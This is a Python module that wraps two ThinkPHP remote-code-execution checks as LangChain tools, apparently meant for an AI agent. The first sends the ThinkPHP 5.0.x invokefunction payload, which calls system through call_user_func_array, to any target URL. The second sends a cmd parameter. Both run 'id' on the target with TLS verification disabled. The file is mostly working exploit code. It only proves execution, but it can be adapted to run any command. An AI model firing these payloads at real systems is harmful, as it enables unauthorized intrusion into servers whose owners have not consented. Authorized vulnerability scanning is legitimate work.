# -*- coding:utf-8 -*-
"""
ThinkPHP漏洞POC验证工具
使用@tool装饰器封装backend.poc.thinkphp模块
"""

from langchain.tools import tool
from typing import Dict, Any


@tool
def thinkphp_rce(target: str, timeout: int = 10) -> Dict[str, Any]:
    """ThinkPHP 远程代码执行漏洞检测工具
    
    检测目标是否存在ThinkPHP远程代码执行漏洞。
    该漏洞存在于invokefunction方法中，允许远程攻击者通过's'参数执行任意系统命令。
    
    影响版本:
    - ThinkPHP 5.0.0 - 5.0.23
    
    检测原理:
    通过向/index.php端点发送包含恶意payload的请求，
    尝试执行'id'命令。如果响应中包含uid=或gid=，则说明存在漏洞。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:8080
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        
        target_url = target.rstrip('/')
        paths = ['/index.php', '/public/index.php']
        
        for path in paths:
            try:
                payload = f"{path}/s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
                verify_url = target_url + payload
                
                resp = requests.get(verify_url, timeout=timeout, verify=False)
                
                if "uid=" in resp.text.lower() or "gid=" in resp.text.lower():
                    return {
                        "success": True,
                        "data": {
                            "vulnerable": True,
                            "vulnerability": "ThinkPHP Remote Code Execution",
                            "target": target_url,
                            "payload": payload,
                            "path": path
                        },
                        "error": None,
                        "metadata": {
                            "tool": "thinkphp_rce",
                            "target": target,
                            "severity": "critical"
                        }
                    }
            except Exception:
                continue
        
        return {
            "success": True,
            "data": {
                "vulnerable": False,
                "target": target_url
            },
            "error": None,
            "metadata": {
                "tool": "thinkphp_rce",
                "target": target
            }
        }
    except ImportError as e:
        return {
            "success": False,
            "data": None,
            "error": f"导入requests模块失败: {str(e)}",
            "metadata": {"tool": "thinkphp_rce", "target": target}
        }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行thinkphp_rce工具异常: {str(e)}",
            "metadata": {"tool": "thinkphp_rce", "target": target}
        }


@tool
def thinkphp_cmd_rce(target: str, path: str = "/index.php", timeout: int = 10) -> Dict[str, Any]:
    """ThinkPHP CMD参数远程代码执行漏洞检测工具
    
    检测目标是否存在ThinkPHP通过cmd参数的远程代码执行漏洞。
    
    检测原理:
    通过发送带有cmd参数的GET请求，尝试执行'id'命令。
    如果响应中包含uid=或gid=，则说明存在漏洞。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:8080
        path: 目标路径，默认为/index.php
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        
        target_url = target.rstrip('/') + path
        payload = {'cmd': 'id'}
        
        r = requests.get(target_url, params=payload, timeout=timeout, verify=False, allow_redirects=False)
        
        if r.status_code == 200 and ('uid=' in r.text or 'gid=' in r.text or 'whoami' in r.text):
            return {
                "success": True,
                "data": {
                    "vulnerable": True,
                    "vulnerability": "ThinkPHP CMD Parameter RCE",
                    "target": target_url,
                    "status_code": r.status_code
                },
                "error": None,
                "metadata": {
                    "tool": "thinkphp_cmd_rce",
                    "target": target,
                    "severity": "critical"
                }
            }
        else:
            return {
                "success": True,
                "data": {
                    "vulnerable": False,
                    "target": target_url,
                    "status_code": r.status_code
                },
                "error": None,
                "metadata": {
                    "tool": "thinkphp_cmd_rce",
                    "target": target
                }
            }
    except ImportError as e:
        return {
            "success": False,
            "data": None,
            "error": f"导入requests模块失败: {str(e)}",
            "metadata": {"tool": "thinkphp_cmd_rce", "target": target}
        }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行thinkphp_cmd_rce工具异常: {str(e)}",
            "metadata": {"tool": "thinkphp_cmd_rce", "target": target}
        }


if __name__ == "__main__":
    test_result = thinkphp_rce.invoke("http://127.0.0.1:8080")
    print(test_result)
    test_result2 = thinkphp_cmd_rce.invoke("http://127.0.0.1:8080")
    print(test_result2)
